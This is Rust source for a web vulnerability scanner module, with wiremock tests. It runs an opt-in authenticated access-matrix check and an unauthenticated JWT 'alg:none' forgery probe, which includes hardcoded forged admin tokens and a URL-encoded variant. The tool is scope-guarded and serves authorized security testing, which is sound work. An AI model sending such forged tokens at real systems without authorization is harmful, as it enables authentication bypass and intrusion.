//! Auth-matrix scanner: logs in with operator-provided credentials and
//! proves the session unlocks routes a guest is denied (guest 403 →
//! authenticated 200). No credentials set, no probing — the scan skips.

use riftlock_core::ScopedClient as Client;
use riftlock_core::{
    text_limited_result, CheckState, CircuitBreaker, Coverage, Evidence, Finding, ProofGate,
    ScanError, Scanner, ScopeGuard,
};
use scraper::{Html, Selector};
use url::Url;

// shortcut: fixed route budget, increase if large auth surfaces get missed
const MAX_ROUTES: usize = 30;

/// The login form's action URL and the two field names to fill.
struct LoginForm {
    action: Url,
    email_field: String,
    password_field: String,
}

/// Credentials are opt-in: the operator opts into the active login probe
/// by setting `RIFTLOCK_USER_A_EMAIL` / `RIFTLOCK_USER_A_PASS`.
fn creds() -> Option<(String, String)> {
    let email = std::env::var("RIFTLOCK_USER_A_EMAIL")
        .ok()
        .filter(|v| !v.is_empty())?;
    let pass = std::env::var("RIFTLOCK_USER_A_PASS")
        .ok()
        .filter(|v| !v.is_empty())?;
    Some((email, pass))
}

/// First `<form>` on the page with a recognizable email and password field.
/// An empty/absent `action` resolves to the page URL itself.
fn find_login_form(doc: &Html, page_url: &Url) -> Option<LoginForm> {
    let form_sel = Selector::parse("form").ok()?;
    let input_sel = Selector::parse("input").ok()?;
    let form = doc.select(&form_sel).next()?;
    let action = page_url
        .join(form.value().attr("action").unwrap_or(""))
        .ok()?;
    let mut email = None;
    let mut password = None;
    for input in form.select(&input_sel) {
        let Some(name) = input.value().attr("name") else {
            continue;
        };
        let lower = name.to_lowercase();
        if email.is_none() && (lower.contains("email") || lower.contains("user")) {
            email = Some(name.to_owned());
        } else if password.is_none()
            && (lower.contains("pass")
                || input.value().attr("type").is_some_and(|t| t == "password"))
        {
            password = Some(name.to_owned());
        }
    }
    Some(LoginForm {
        action,
        email_field: email?,
        password_field: password?,
    })
}

/// Whether the engine's soft deadline has passed. Requests are never started
/// after it; the CLI's drain slack absorbs one in-flight request cap.
fn overdue(deadline: Option<std::time::Instant>) -> bool {
    deadline.is_some_and(|deadline| std::time::Instant::now() >= deadline)
}

fn is_auth_endpoint(url: &Url) -> bool {
    let path = url.path();
    ["/login", "/auth", "/signin", "/register", "/api/v1/auth"]
        .iter()
        .any(|part| path.contains(part))
        && !["/logout", "/signout", "/sign-out"]
            .iter()
            .any(|part| path.contains(part))
}

/// Form-based auth-matrix scanner.
#[derive(Debug, Default)]
pub struct AuthScanner {
    /// Run even when `matches()` rejects the host.
    pub force_run: bool,
    /// Discovered URLs; only login, auth, signin and register paths are probed.
    pub endpoints: Vec<String>,
    /// Per-check ledger: one check per JWT route and one per cookie route.
    pub coverage: Coverage,
}

impl Scanner for AuthScanner {
    fn id(&self) -> &'static str {
        "auth"
    }

    fn matches(&self, _url: &Url) -> bool {
        true
    }

    async fn scan(
        &self,
        url: &Url,
        client: &Client,
        guard: &ScopeGuard,
        passive: bool,
    ) -> Result<Vec<Finding>, ScanError> {
        self.scan_until(url, client, guard, passive, None).await
    }

    async fn scan_until(
        &self,
        url: &Url,
        client: &Client,
        guard: &ScopeGuard,
        passive: bool,
        deadline: Option<std::time::Instant>,
    ) -> Result<Vec<Finding>, ScanError> {
        if passive || (!self.force_run && !self.matches(url)) {
            return Ok(Vec::new());
        }
        guard.check_active(url)?;
        let mut routes = Vec::new();
        for endpoint in
            std::iter::once(url.as_str()).chain(self.endpoints.iter().map(String::as_str))
        {
            let Ok(target) = url.join(endpoint) else {
                continue;
            };
            if is_auth_endpoint(&target)
                && guard.check(&target).is_ok()
                && !routes.contains(&target.to_string())
            {
                routes.push(target.to_string());
            }
        }
        // Use the CLI's shared client: its strict TLS, timeout, pool and
        // redirect policy apply consistently to every scanner.
        let mut findings = probe_jwt_none(client, guard, &routes, deadline, &self.coverage).await?;
        if overdue(deadline) {
            return Ok(findings);
        }
        // Read depth keeps the GET-based forgery probe, but the login POST
        // below is state-changing and belongs to auth/max depths.
        if guard.is_read_only() {
            return Ok(findings);
        }
        // The cookie auth-matrix is opt-in via env credentials; without them
        // it is a clean skip and only the alg:none probe ran.
        let Some((email, pass)) = creds() else {
            return Ok(findings);
        };
        let login_url = url.join("/login").map_err(|_| ScanError::InvalidUrl)?;
        guard.check(&login_url)?;
        // Any transport error or non-200 on the login page is a clean skip:
        // no login form means the cookie matrix has nothing to prove.
        let resp = match client.get(login_url.clone()).send().await {
            Ok(r) => r,
            Err(_) => return Ok(findings),
        };
        if resp.status().as_u16() != 200 {
            return Ok(findings);
        }
        let page = match text_limited_result(resp).await {
            Ok(page) => page,
            Err(error) => {
                riftlock_core::logln!(
                    "[!] Auth login page unreadable ({error}); endpoint marked failed."
                );
                self.coverage.unreadable_endpoint_at(login_url.as_str());
                return Ok(findings);
            }
        };
        // scraper::Html is not Send: parse and extract before any await.
        let form = {
            let doc = Html::parse_document(&page);
            find_login_form(&doc, &login_url)
        };
        let Some(form) = form else {
            return Ok(findings);
        };
        if !is_auth_endpoint(&form.action) {
            return Ok(findings);
        }
        // A form action may point at another host; the guard rejects it,
        // the action is recorded as skipped, and the proofs already
        // gathered are returned.
        if guard.check_active(&form.action).is_err() {
            self.coverage.out_of_scope_endpoint_at(form.action.as_str());
            riftlock_core::logln!("[~] Auth login form action skipped: out of scope");
            return Ok(findings);
        }
        if overdue(deadline) {
            return Ok(findings);
        }
        // The login POST is the one active write-ish probe here; the operator
        // opted into it by setting the env credentials above.
        let login_resp = match client
            .post(form.action.clone())
            .form(&[
                (form.email_field.as_str(), email.as_str()),
                (form.password_field.as_str(), pass.as_str()),
            ])
            .send()
            .await
        {
            Ok(r) => r,
            Err(_) => return Ok(findings),
        };
        if !login_resp.status().is_success() {
            return Ok(findings);
        }
        let Some(set_cookie) = login_resp.headers().get_all("set-cookie").iter().next() else {
            return Ok(findings);
        };
        let Ok(raw_cookie) = set_cookie.to_str() else {
            return Ok(findings);
        };
        let cookie = raw_cookie.split(';').next().unwrap_or("").trim().to_owned();
        if cookie.is_empty() {
            return Ok(findings);
        }
        let mut cookie_breaker = CircuitBreaker::default();
        for route in routes.iter().take(MAX_ROUTES) {
            // The engine budget is authoritative: stop before a request that
            // would run past it, keeping every finding already proved.
            if overdue(deadline) {
                break;
            }
            let Ok(target) = Url::parse(route) else {
                continue;
            };
            if guard.check(&target).is_err() {
                continue;
            }
            let check = self.coverage.begin_check();
            let without_key = match client.get(target.clone()).send().await {
                Ok(r) => r.status().as_u16(),
                Err(error) => {
                    let _ = check.finish(if error.is_timeout() {
                        CheckState::TimedOut
                    } else {
                        CheckState::Failed
                    });
                    continue;
                }
            };
            if without_key != 403 {
                let _ = check.finish(CheckState::Completed);
                continue;
            }
            if overdue(deadline) {
                break;
            }
            let with_key = match client
                .get(target.clone())
                .header("cookie", &cookie)
                .send()
                .await
            {
                Ok(r) => {
                    cookie_breaker.healthy();
                    r.status().as_u16()
                }
                Err(error) => {
                    let _ = check.finish(if error.is_timeout() {
                        CheckState::TimedOut
                    } else {
                        CheckState::Failed
                    });
                    if cookie_breaker.failed() {
                        break;
                    }
                    continue;
                }
            };
            let _ = check.finish(CheckState::Completed);
            if with_key == 200 {
                // Plain admit (as in supabase): the Differential evidence
                // carries statuses only, never a body, so the HTML-200
                // uncertainty rule in proof.rs::admit_with_verifier is moot.
                findings.push(ProofGate::admit(Evidence::Differential {
                    without_key,
                    with_key,
                    inverted: true,
                    cross_tenant: false,
                    note: Some("auth_matrix".to_owned()),
                })?);
            }
        }
        Ok(findings)
    }
}

// shortcut: hardcoded base64url of `{"alg":"none","typ":"JWT"}` and
// `{"role":"admin"}`; recompute if the claims ever change
const JWT_HEADER_B64: &str = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0";
const JWT_PAYLOAD_B64: &str = "eyJyb2xlIjoiYWRtaW4ifQ";
// Percent-encoded header JSON. Some vulnerable backends never parse the
// token: they substring-match `alg":"none` (or its URL-encoding) inside the
// raw Authorization header, so both spellings must be probed.
const JWT_HEADER_B64_URL_ENC: &str = "%7B%22alg%22%3A%22none%22%2C%22typ%22%3A%22JWT%22%7D";
// Base64url of `{"alg":"HS256","typ":"JWT"}` with a garbage signature: the
// control token a target that verifies signatures must reject.
const JWT_CONTROL: &str =
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.bm90LWEtc2lnbmF0dXJl";

/// A 2xx body that could be protected content: non-empty, not an SPA shell,
/// and not a login page bounced back with a 200.
fn looks_protected(body: &str) -> bool {
    let lower = body.trim().to_ascii_lowercase();
    !lower.is_empty()
        && !["<app-root>", "__next", "id=\"root\""]
            .iter()
            .any(|m| lower.contains(m))
        && ![
            "type=\"password\"",
            "name=\"password\"",
            ">login<",
            ">log in<",
            ">sign in<",
        ]
        .iter()
        .any(|m| lower.contains(m))
}

/// Unauthenticated `alg:none` forgery probe over the filtered routes. Emits
/// `JwtVulnerability { issue: "alg_none" }` only when the endpoint denies an
/// unauthenticated request (401/403 baseline), rejects a bad-signature HS256
/// control, and the 2xx response itself carries a token whose base64url
/// header is `alg:none`. A 2xx that does not return such a token is reported
/// as INFO (`token not directly observed`): accepting our forged bearer is
/// not proof the endpoint honoured it.
async fn probe_jwt_none(
    client: &Client,
    guard: &ScopeGuard,
    routes: &[String],
    deadline: Option<std::time::Instant>,
    coverage: &Coverage,
) -> Result<Vec<Finding>, ScanError> {
    let forged = format!("{JWT_HEADER_B64}.{JWT_PAYLOAD_B64}.");
    let raw = format!("{JWT_HEADER_B64_URL_ENC}.{JWT_PAYLOAD_B64}.");
    let mut findings = Vec::new();
    // A WAF dropping every route request costs one 5 s timeout per route;
    // three consecutive failures abort the probe with a recorded failure.
    let mut breaker = CircuitBreaker::default();
    // API-shaped routes probe first: on SPA targets the wordlist flood of
    // fallback pages would otherwise spend the route cap before any real
    // (401-denying) API route is reached.
    let mut ordered: Vec<(&String, bool)> = routes
        .iter()
        .map(|r| {
            let api = Url::parse(r)
                .map(|u| u.path().starts_with("/api") || u.path().starts_with("/rest"))
                .unwrap_or(false);
            (r, api)
        })
        .collect();
    ordered.sort_by_key(|(_, api)| !*api);
    'route: for route in ordered.into_iter().take(MAX_ROUTES).map(|(r, _)| r) {
        if overdue(deadline) {
            break;
        }
        let Ok(target) = Url::parse(route) else {
            continue;
        };
        if guard.check(&target).is_err() {
            continue;
        }
        let check = coverage.begin_check();
        // Baseline: the endpoint must actually deny an unauthenticated
        // request, or there is no bypass to prove.
        let baseline = match client.get(target.clone()).send().await {
            Ok(r) => {
                breaker.healthy();
                r.status().as_u16()
            }
            Err(error) => {
                let _ = check.finish(if error.is_timeout() {
                    CheckState::TimedOut
                } else {
                    CheckState::Failed
                });
                if breaker.failed() {
                    return Err(CircuitBreaker::tripped_error());
                }
                continue;
            }
        };
        if !matches!(baseline, 401 | 403) {
            let _ = check.finish(CheckState::Completed);
            continue;
        }
        if overdue(deadline) {
            break;
        }
        // Control: a correctly-shaped HS256 token with a garbage signature
        // must be rejected. If it is accepted the endpoint takes any bearer,
        // which proves auth is broken but not that `alg:none` is honoured.
        let control = match client
            .get(target.clone())
            .header("authorization", format!("Bearer {JWT_CONTROL}"))
            .send()
            .await
        {
            Ok(r) => r.status().as_u16(),
            Err(error) => {
                let _ = check.finish(if error.is_timeout() {
                    CheckState::TimedOut
                } else {
                    CheckState::Failed
                });
                continue;
            }
        };
        if (200..300).contains(&control) {
            let _ = check.finish(CheckState::Completed);
            continue;
        }
        for bearer in [&forged, &raw] {
            let bypass = match client
                .get(target.clone())
                .header("authorization", format!("Bearer {bearer}"))
                .send()
                .await
            {
                Ok(r) => {
                    let status = r.status().as_u16();
                    match text_limited_result(r).await {
                        Ok(body) => (status, body),
                        Err(error) => {
                            riftlock_core::logln!(
                                "[!] Auth JWT response unreadable ({error}); endpoint marked failed."
                            );
                            coverage.endpoint_at(
                                target.as_str(),
                                riftlock_core::EndpointOutcome::Failed,
                            );
                            let _ = check.finish(CheckState::Inconclusive);
                            continue 'route;
                        }
                    }
                }
                Err(_) => continue,
            };
            if (200..300).contains(&bypass.0) && looks_protected(&bypass.1) {
                // Critical only when the target itself returns a token whose
                // base64url header segment is `alg:none`; our forged bearer
                // being accepted is not direct observation of such a token.
                let issue = if bypass.1.contains(JWT_HEADER_B64) {
                    "alg_none"
                } else {
                    "alg_none_unverified (token not directly observed)"
                };
                findings.push(ProofGate::admit(Evidence::JwtVulnerability {
                    endpoint: target.to_string(),
                    issue: issue.to_owned(),
                })?);
                break;
            }
        }
        let _ = check.finish(CheckState::Completed);
    }
    Ok(findings)
}

#[cfg(test)]
mod tests {
    use super::*;
    use riftlock_core::ScanPolicy;
    use wiremock::matchers::{header, header_regex, method, path};
    use wiremock::{Mock, MockServer, ResponseTemplate};

    /// Login form fixture; `with_password` false omits the password field.
    fn login_form(with_password: bool) -> String {
        let pass = if with_password {
            r#"<input type="password" name="password">"#
        } else {
            ""
        };
        format!(
            r#"<html><body><form method="POST" action="/login">
            <input type="text" name="email">{pass}
            <input type="submit"></form></body></html>"#
        )
    }

    /// Set the opt-in credentials. Every test sets the same values, so the
    /// process-global mutation cannot race into a different state.
    fn set_creds() {
        std::env::set_var("RIFTLOCK_USER_A_EMAIL", "a@example.com");
        std::env::set_var("RIFTLOCK_USER_A_PASS", "hunter2");
    }

    async fn start_site() -> (MockServer, Url, ScopeGuard) {
        let server = MockServer::start().await;
        let host = Url::parse(&server.uri())
            .expect("url")
            .host_str()
            .unwrap_or_default()
            .to_owned();
        let origin = format!("https://{host}");
        let base = Url::parse(&format!("{}/", server.uri())).expect("url");
        (
            server,
            base,
            ScopeGuard::new_lab(&[origin.as_str()]).expect("guard"),
        )
    }

    /// Mount the full happy-path site: login page, login POST issuing the
    /// session cookie, an index linking /auth/admin, and /auth/admin (403 guest,
    /// 200 with the session cookie).
    async fn mount_happy_site(server: &MockServer) {
        Mock::given(method("GET"))
            .and(path("/login"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "text/html")
                    .set_body_string(login_form(true)),
            )
            .mount(server)
            .await;
        Mock::given(method("POST"))
            .and(path("/login"))
            .respond_with(
                ResponseTemplate::new(200).append_header("set-cookie", "session=abc123; Path=/"),
            )
            .mount(server)
            .await;
        Mock::given(method("GET"))
            .and(path("/"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "text/html")
                    .set_body_string(
                        "<html><body><a href='/login'>login</a>\
                         <a href='/auth/admin'>admin</a></body></html>",
                    ),
            )
            .mount(server)
            .await;
        Mock::given(method("GET"))
            .and(path("/auth/admin"))
            .and(header("cookie", "session=abc123"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "application/json")
                    .set_body_string("{\"ok\":true}"),
            )
            .with_priority(1)
            .mount(server)
            .await;
        Mock::given(method("GET"))
            .and(path("/auth/admin"))
            .respond_with(ResponseTemplate::new(403))
            .with_priority(2)
            .mount(server)
            .await;
    }

    async fn scan(
        base: &Url,
        guard: &ScopeGuard,
        passive: bool,
    ) -> Result<Vec<Finding>, ScanError> {
        AuthScanner {
            force_run: true,
            endpoints: [
                "/login",
                "/auth/admin",
                "/auth/protected",
                "/api/v1/auth/admin/dashboard",
            ]
            .into_iter()
            .map(String::from)
            .collect(),
            coverage: Coverage::default(),
        }
        .scan(base, &Client::new_lab(), guard, passive)
        .await
    }

    #[tokio::test]
    async fn auth_matrix_emits_differential() {
        set_creds();
        let (server, base, guard) = start_site().await;
        mount_happy_site(&server).await;
        let findings = scan(&base, &guard, false).await.expect("scan");
        assert_eq!(findings.len(), 1);
        match findings[0].evidence() {
            Evidence::Differential {
                without_key,
                with_key,
                inverted,
                cross_tenant,
                note,
            } => {
                assert_eq!(*without_key, 403);
                assert_eq!(*with_key, 200);
                assert!(*inverted);
                assert!(!*cross_tenant);
                assert_eq!(note.as_deref(), Some("auth_matrix"));
            }
            other => panic!("expected Differential, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn login_form_without_password_is_a_clean_skip() {
        set_creds();
        let (server, base, guard) = start_site().await;
        Mock::given(method("GET"))
            .and(path("/login"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "text/html")
                    .set_body_string(login_form(false)),
            )
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "text/html")
                    .set_body_string("<html><body><a href='/login'>login</a></body></html>"),
            )
            .mount(&server)
            .await;
        let post = Mock::given(method("POST"))
            .and(path("/login"))
            .respond_with(ResponseTemplate::new(200))
            .mount_as_scoped(&server)
            .await;
        assert!(scan(&base, &guard, false).await.expect("scan").is_empty());
        assert!(
            post.received_requests().await.is_empty(),
            "login POST without a password field"
        );
    }

    #[tokio::test]
    async fn admin_denied_even_with_session_is_no_finding() {
        set_creds();
        let (server, base, guard) = start_site().await;
        // Login works, but /auth/admin denies every request — session or not.
        // One unconditional mock: no priority juggling.
        Mock::given(method("GET"))
            .and(path("/login"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "text/html")
                    .set_body_string(login_form(true)),
            )
            .mount(&server)
            .await;
        Mock::given(method("POST"))
            .and(path("/login"))
            .respond_with(
                ResponseTemplate::new(200).append_header("set-cookie", "session=abc123; Path=/"),
            )
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "text/html")
                    .set_body_string("<html><body><a href='/auth/admin'>admin</a></body></html>"),
            )
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/auth/admin"))
            .respond_with(ResponseTemplate::new(403))
            .mount(&server)
            .await;
        assert!(scan(&base, &guard, false).await.expect("scan").is_empty());
    }

    #[test]
    fn auth_filter_uses_only_paths_and_excludes_logout() {
        for path in [
            "/login",
            "/auth/token",
            "/signin",
            "/register",
            "/api/v1/auth/user",
        ] {
            assert!(is_auth_endpoint(
                &Url::parse(&format!("https://example.com{path}")).expect("url")
            ));
        }
        for url in [
            "https://example.com/admin",
            "https://example.com/data?next=/login",
            "https://login.example.com/data",
            "https://example.com/auth/logout",
            "https://example.com/auth/signout",
            "https://example.com/auth/sign-out",
        ] {
            assert!(!is_auth_endpoint(&Url::parse(url).expect("url")), "{url}");
        }
    }

    #[tokio::test]
    async fn only_discovered_auth_routes_are_requested() {
        let (server, base, guard) = start_site().await;
        let scanner = AuthScanner {
            force_run: true,
            endpoints: [
                "/login",
                "/auth",
                "/signin",
                "/register",
                "/api/v1/auth",
                "/auth",
                "/admin",
                "/data?next=/login",
                "/auth/logout",
                "https://example.invalid/login",
            ]
            .into_iter()
            .map(String::from)
            .collect(),
            coverage: Coverage::default(),
        };
        assert!(scanner
            .scan(&base, &Client::new_lab(), &guard, false)
            .await
            .expect("scan")
            .is_empty());
        let requests = server.received_requests().await.expect("requests");
        assert!(
            requests.iter().all(|r| is_auth_endpoint(&r.url)),
            "{requests:?}"
        );
        for route in ["/auth", "/signin", "/register", "/api/v1/auth"] {
            assert_eq!(
                requests.iter().filter(|r| r.url.path() == route).count(),
                1,
                "{route}"
            );
        }
    }

    #[tokio::test]
    async fn login_action_outside_auth_routes_is_not_submitted() {
        set_creds();
        let (server, base, guard) = start_site().await;
        Mock::given(method("GET"))
            .and(path("/login"))
            .respond_with(ResponseTemplate::new(200).set_body_string(
                login_form(true).replace("action=\"/login\"", "action=\"/submit\""),
            ))
            .mount(&server)
            .await;
        assert!(scan(&base, &guard, false).await.expect("scan").is_empty());
        assert!(server
            .received_requests()
            .await
            .expect("requests")
            .iter()
            .all(|r| r.method == "GET"));
    }

    /// Read depth may run the GET-only JWT probe, but the credential login is
    /// a POST and must never leave the process.
    #[tokio::test]
    async fn read_only_guard_never_submits_login() {
        set_creds();
        let (server, base, guard) = start_site().await;
        mount_happy_site(&server).await;
        let guard = guard.with_policy(ScanPolicy::ReadOnly);
        let findings = scan(&base, &guard, false).await.expect("scan");
        assert!(findings.is_empty(), "{findings:?}");
        let requests = server.received_requests().await.expect("requests");
        let methods: Vec<&str> = requests.iter().map(|r| r.method.as_str()).collect();
        assert!(
            requests
                .iter()
                .all(|r| matches!(r.method.as_str(), "GET" | "HEAD" | "OPTIONS")),
            "read scan wrote: {methods:?}"
        );
    }

    #[tokio::test]
    async fn engine_deadline_bounds_the_cookie_matrix_and_keeps_findings() {
        use std::time::{Duration, Instant};
        set_creds();
        let (server, base, guard) = start_site().await;
        mount_happy_site(&server).await;
        // Two quick JWT routes allow the cookie matrix to prove its first
        // differential; the next authenticated cookie response stalls past
        // the soft deadline, so later routes must remain unrequested.
        let endpoints = vec![
            "/auth/admin".to_owned(),
            "/auth/slow0".to_owned(),
            "/auth/slow1".to_owned(),
        ];
        for route in ["/auth/admin", "/auth/slow0", "/auth/slow1"] {
            // Keep the JWT control path cheap so this regression isolates the
            // cookie matrix's partial-finding behavior under the shared limiter.
            Mock::given(method("GET"))
                .and(path(route))
                .and(header("authorization", format!("Bearer {JWT_CONTROL}")))
                .respond_with(ResponseTemplate::new(200))
                .with_priority(1)
                .mount(&server)
                .await;
        }
        for i in 0..2 {
            Mock::given(method("GET"))
                .and(path(format!("/auth/slow{i}")))
                .and(header_regex("cookie", "session=abc123"))
                .respond_with(ResponseTemplate::new(200).set_delay(Duration::from_secs(2)))
                .with_priority(1)
                .mount(&server)
                .await;
            Mock::given(method("GET"))
                .and(path(format!("/auth/slow{i}")))
                .respond_with(ResponseTemplate::new(403))
                .with_priority(2)
                .mount(&server)
                .await;
        }
        let scanner = AuthScanner {
            force_run: true,
            endpoints,
            coverage: Coverage::default(),
        };
        let started = Instant::now();
        let findings = scanner
            .scan_until(
                &base,
                &Client::new_lab(),
                &guard,
                false,
                Some(Instant::now() + Duration::from_secs(1)),
            )
            .await
            .expect("scan");
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "deadline ignored: {:?}",
            started.elapsed()
        );
        assert!(
            findings.iter().any(|f| matches!(
                f.evidence(),
                Evidence::Differential {
                    without_key: 403,
                    with_key: 200,
                    ..
                }
            )),
            "partial finding lost: {findings:?}"
        );
    }

    #[tokio::test]
    async fn passive_mode_sends_no_requests() {
        let (server, base, guard) = start_site().await;
        assert!(scan(&base, &guard, true).await.expect("scan").is_empty());
        assert!(server
            .received_requests()
            .await
            .expect("requests")
            .is_empty());
    }

    /// Mount an index page plus a `/auth/protected` endpoint that emulates the
    /// E2E lab: 401 unauthenticated, and a 200 whose body reissues the
    /// accepted token when the Authorization header carries either
    /// `alg":"none` bearer value (matched here by exact value — same subset
    /// the lab substring-matches). Reissuing the token is what makes the
    /// finding directly observed rather than unverified.
    async fn mount_jwt_lab(server: &MockServer, denied_with_token: bool) {
        let forged = format!("{JWT_HEADER_B64}.{JWT_PAYLOAD_B64}.");
        let raw = format!("{JWT_HEADER_B64_URL_ENC}.{JWT_PAYLOAD_B64}.");
        let status = if denied_with_token { 401 } else { 200 };
        Mock::given(method("GET"))
            .and(path("/"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "text/html")
                    .set_body_string("<html><body>index</body></html>"),
            )
            .mount(server)
            .await;
        for (token, priority) in [(forged, 1u8), (raw, 2u8)] {
            Mock::given(method("GET"))
                .and(path("/auth/protected"))
                .and(header("authorization", format!("Bearer {token}")))
                .respond_with(
                    ResponseTemplate::new(status)
                        .insert_header("content-type", "application/json")
                        .set_body_string(format!(
                            "{{\"status\":\"success\",\"token\":\"{token}\"}}"
                        )),
                )
                .with_priority(priority)
                .mount(server)
                .await;
        }
        Mock::given(method("GET"))
            .and(path("/auth/protected"))
            .respond_with(ResponseTemplate::new(401))
            .with_priority(3)
            .mount(server)
            .await;
    }

    #[tokio::test]
    async fn alg_none_forgery_is_proven_with_baseline() {
        let (server, base, guard) = start_site().await;
        mount_jwt_lab(&server, false).await;
        let findings = scan(&base, &guard, false).await.expect("scan");
        assert_eq!(findings.len(), 1);
        match findings[0].evidence() {
            Evidence::JwtVulnerability { endpoint, issue } => {
                assert!(endpoint.ends_with("/auth/protected"), "{endpoint}");
                assert_eq!(issue, "alg_none");
            }
            other => panic!("expected JwtVulnerability, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn alg_none_denied_everywhere_is_no_finding() {
        let (server, base, guard) = start_site().await;
        mount_jwt_lab(&server, true).await;
        assert!(scan(&base, &guard, false).await.expect("scan").is_empty());
    }

    /// A 2xx to the forged bearer is not proof the endpoint honoured it. With
    /// no `alg:none` token reissued in the body the finding is INFO-worded,
    /// never the Critical `alg_none`.
    #[tokio::test]
    async fn accepted_forgery_without_an_issued_token_is_info() {
        let (server, base, guard) = start_site().await;
        let forged = format!("Bearer {JWT_HEADER_B64}.{JWT_PAYLOAD_B64}.");
        Mock::given(method("GET"))
            .and(path("/"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "text/html")
                    .set_body_string("<html><body>index</body></html>"),
            )
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/auth/protected"))
            .and(header("authorization", forged))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "application/json")
                    .set_body_string("{\"status\":\"success\"}"),
            )
            .with_priority(1)
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/auth/protected"))
            .respond_with(ResponseTemplate::new(401))
            .with_priority(2)
            .mount(&server)
            .await;
        let findings = scan(&base, &guard, false).await.expect("scan");
        assert_eq!(findings.len(), 1);
        let Evidence::JwtVulnerability { issue, .. } = findings[0].evidence() else {
            panic!("expected JwtVulnerability");
        };
        assert!(issue.contains("not directly observed"), "{issue}");
    }

    /// `/api/v1/auth/admin/dashboard` 401s an unauthenticated request but
    /// accepts any `Bearer eyJ…` — signature never verified. The bad-signature
    /// control token is accepted too, so this proves broken auth, not that the
    /// endpoint honours `alg:none`.
    #[tokio::test]
    async fn endpoint_accepting_any_eyj_bearer_is_not_flagged() {
        use wiremock::matchers::header_regex;
        let (server, base, guard) = start_site().await;
        Mock::given(method("GET"))
            .and(path("/"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "text/html")
                    .set_body_string("<html><body>index</body></html>"),
            )
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/api/v1/auth/admin/dashboard"))
            .and(header_regex("authorization", r"^Bearer eyJ"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "application/json")
                    .set_body_string("{\"status\":\"success\"}"),
            )
            .with_priority(1)
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/api/v1/auth/admin/dashboard"))
            .respond_with(ResponseTemplate::new(401))
            .with_priority(2)
            .mount(&server)
            .await;
        assert!(scan(&base, &guard, false).await.expect("scan").is_empty());
    }

    /// The forged token is accepted with a 2xx, and the control is rejected,
    /// but the body is a generic SPA shell: nothing proves protected content
    /// was served, so no finding.
    #[tokio::test]
    async fn alg_none_without_protected_content_is_not_flagged() {
        let (server, base, guard) = start_site().await;
        let forged = format!("Bearer {JWT_HEADER_B64}.{JWT_PAYLOAD_B64}.");
        Mock::given(method("GET"))
            .and(path("/"))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "text/html")
                    .set_body_string("<html><body>index</body></html>"),
            )
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/auth/protected"))
            .and(header("authorization", forged))
            .respond_with(
                ResponseTemplate::new(200)
                    .insert_header("content-type", "text/html")
                    .set_body_string("<app-root></app-root>"),
            )
            .with_priority(1)
            .mount(&server)
            .await;
        Mock::given(method("GET"))
            .and(path("/auth/protected"))
            .respond_with(ResponseTemplate::new(401))
            .with_priority(2)
            .mount(&server)
            .await;
        assert!(scan(&base, &guard, false).await.expect("scan").is_empty());
    }
}
